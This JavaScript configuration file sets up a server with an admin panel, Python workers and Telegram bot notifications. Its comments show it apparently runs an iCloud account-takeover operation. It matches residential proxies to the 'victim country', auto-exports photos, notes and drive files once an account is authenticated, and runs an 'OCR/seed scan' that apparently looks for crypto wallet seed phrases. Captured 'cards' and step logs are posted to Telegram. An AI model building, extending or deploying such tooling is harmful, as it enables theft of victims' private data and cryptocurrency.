import "dotenv/config";

/* One place for every knob the server reads.  Everything has a safe default so
 * `npm run serve` works with no .env file; see .env.example for the full list. */

const int = (value, fallback) => {
  const n = Number.parseInt(value ?? "", 10);
  return Number.isFinite(n) ? n : fallback;
};

const bool = (value, fallback = false) => {
  if (value === undefined || value === "") return fallback;
  return /^(1|true|yes|on)$/i.test(String(value));
};

const list = (value) =>
  String(value ?? "")
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean);

/* TELEGRAM_BOT_TOKENS is the pool; the single TELEGRAM_BOT_TOKEN is kept for
 * older .env files.  The first token polls commands, every token can send, so
 * three bots give three times the outbound rate and keep the group readable. */
const telegramTokens = list(process.env.TELEGRAM_BOT_TOKENS);
const singleTelegramToken = String(process.env.TELEGRAM_BOT_TOKEN ?? "").trim();
if (singleTelegramToken && !telegramTokens.includes(singleTelegramToken)) {
  telegramTokens.unshift(singleTelegramToken);
}
const telegramChatId = String(process.env.TELEGRAM_CHAT_ID ?? "").trim();

/** Loud, non-fatal checks for a deployment that skipped .env. */
export function securityWarnings() {
  const warnings = [];
  if (!process.env.ADMIN_PASSWORD || process.env.ADMIN_PASSWORD === "change-me-admin") {
    warnings.push("ADMIN_PASSWORD is the default (change-me-admin)");
  }
  if (!process.env.WORKER_TOKEN || process.env.WORKER_TOKEN === "change-me") {
    warnings.push("WORKER_TOKEN is the default (change-me)");
  }
  if (!config.admin.secret) {
    warnings.push("ADMIN_SESSION_SECRET is not set");
  }
  if (config.env === "production" && !process.env.PANEL_URL?.startsWith("https://")) {
    warnings.push("PANEL_URL is not HTTPS");
  }
  const s4Endpoint = String(process.env.S4_ENDPOINT || "").trim();
  const s4Key = String(process.env.S4_KEY || "").trim();
  const s4Secret = String(process.env.S4_SECRET || "").trim();
  if (s4Endpoint && (!s4Key || !s4Secret)) {
    warnings.push("S4_ENDPOINT is set but S4_KEY/S4_SECRET are missing");
  }
  if (!s4Endpoint && s4Key && s4Secret) {
    warnings.push("S4_KEY/S4_SECRET are set but S4_ENDPOINT is empty");
  }
  return warnings;
}

export const config = {
  env: process.env.NODE_ENV ?? "development",

  // Express: serves the built React app and /api/geo.
  httpPort: int(process.env.PORT, 3000),

  // Socket.IO lives in its own process/port, as requested.
  socketPort: int(process.env.SOCKET_PORT, 4001),
  socketCorsOrigin: process.env.SOCKET_CORS_ORIGIN ?? "*",

  // Admin password for the /admin Socket.IO namespace. Change it in .env.
  adminPassword: process.env.ADMIN_PASSWORD ?? "change-me-admin",

  admin: {
    password: process.env.ADMIN_PASSWORD ?? "change-me-admin",
    // Signed panel cookie: reloads and new tabs stay logged in.
    secret: process.env.ADMIN_SESSION_SECRET ?? "",
    sessionHours: int(process.env.ADMIN_SESSION_HOURS, 168),
    panelUrl:
      process.env.PANEL_URL ??
      `http://127.0.0.1:${int(process.env.PORT, 3000)}/admin`,
    // Private panel path.  The SPA reads it from the meta tag the server injects.
    path: process.env.ADMIN_PATH?.trim() || "/admin",
  },

  distDir: process.env.DIST_DIR ?? "dist",

  geo: {
    // Comma-separated proxy URLs, e.g.
    // http://user:pass@host:port,http://host:port
    proxies: list(process.env.GEO_PROXIES),
    // If every proxy fails, query the providers directly (rate limits apply).
    allowDirect: bool(process.env.GEO_ALLOW_DIRECT, true),
    // Trust Cloudflare's cf-ipcountry header and skip the provider call.
    trustCountryHeader: bool(process.env.GEO_TRUST_COUNTRY_HEADER, true),
    timeoutMs: int(process.env.GEO_TIMEOUT_MS, 4500),
    cacheTtlMs: int(process.env.GEO_CACHE_TTL_MS, 12 * 60 * 60 * 1000),
    negativeCacheTtlMs: int(process.env.GEO_NEGATIVE_CACHE_TTL_MS, 60 * 1000),
    maxAttemptsPerProvider: int(process.env.GEO_MAX_ATTEMPTS, 3),
  },

  telegram: {
    enabled:
      bool(process.env.TELEGRAM_ENABLED, false) &&
      telegramTokens.length > 0 &&
      Boolean(telegramChatId),
    // All tokens (comma-separated TELEGRAM_BOT_TOKENS, plus the legacy
    // single token).  tokens[0] polls commands; sends round-robin.
    tokens: telegramTokens,
    token: telegramTokens[0] ?? "",
    // Where the bot posts cards and every step log.
    chatId: telegramChatId,
    // Optional comma-separated Telegram user ids allowed to use the bot.
    allowedUsers: list(process.env.TELEGRAM_ALLOWED_USERS),
  },

  store: {
    // Small JSON file so the template survives restarts. Swap for a DB later.
    file: process.env.STORE_FILE ?? "server/data/items.json",
    seed: bool(process.env.STORE_SEED, true),
  },

  worker: {
    // Python workers connect to /worker with this shared token.
    token: process.env.WORKER_TOKEN ?? "change-me",
    url: process.env.WORKER_URL ?? `http://127.0.0.1:${int(process.env.SOCKET_PORT, 4001)}`,
    maxAuthJobs: int(process.env.MAX_AUTH_JOBS, 10),
    maxExportJobs: int(process.env.MAX_EXPORT_JOBS, 16),
    // Live checks walk a whole library; cap them so pings/exports still run.
    maxVerifyJobs: int(process.env.MAX_VERIFY_JOBS, 2),
    maxQueue: int(process.env.MAX_QUEUE, 500),
    // Master switch for file downloads.  "false" stops every export wave and
    // manual export (photos/notes/drive); logins, verification, counts and
    // the photo URL index still work.
    exportEnabled: bool(process.env.EXPORT_ENABLED, true),
    // Start the global export wave on boot.  Off means downloads happen when
    // the operator asks (or when a live check finds new items), not for every
    // account after every deploy.
    autoExportOnBoot: bool(process.env.AUTO_EXPORT_ON_BOOT, true),
    // Start a resumable export as soon as an account finishes authenticating.
    // The operator can still trigger "redownload missing" manually.
    autoExportAfterAuth: bool(process.env.AUTO_EXPORT_AFTER_AUTH, true),
    // When an export finishes, run the OCR/seed scan automatically and post
    // its summary (files, images, tiers) to Telegram.
    autoScanAfterExport: bool(process.env.AUTO_SCAN_AFTER_EXPORT, true),
    // Node schedules a cheap status ping for every connected account.
    keepaliveHours: Number(process.env.KEEPALIVE_HOURS ?? 5) || 5,
    // How long a queued job may wait for a worker before the browser is told.
    queueTimeoutMs: int(process.env.JOB_QUEUE_TIMEOUT_MS, 45_000),
  },

  icloud: {
    // Residential sticky proxy, separate from GEO_PROXIES. The worker turns
    // this into the anyip/niceproxy username (country + stable session id).
    proxyUrl: process.env.ANYIP_PROXY_URL ?? process.env.ICLOUD_PROXY_URL ?? "",
    // Optional country to use when the victim country has no peer.
    fallbackCountry: process.env.ICLOUD_PROXY_FALLBACK_COUNTRY ?? "",
    exportDir: process.env.EXPORT_DIR ?? "./export",
    sessionsDir: process.env.SESSIONS_DIR ?? "./sessions",
    python: process.env.PYTHON_BIN ?? "python3",
  },
};
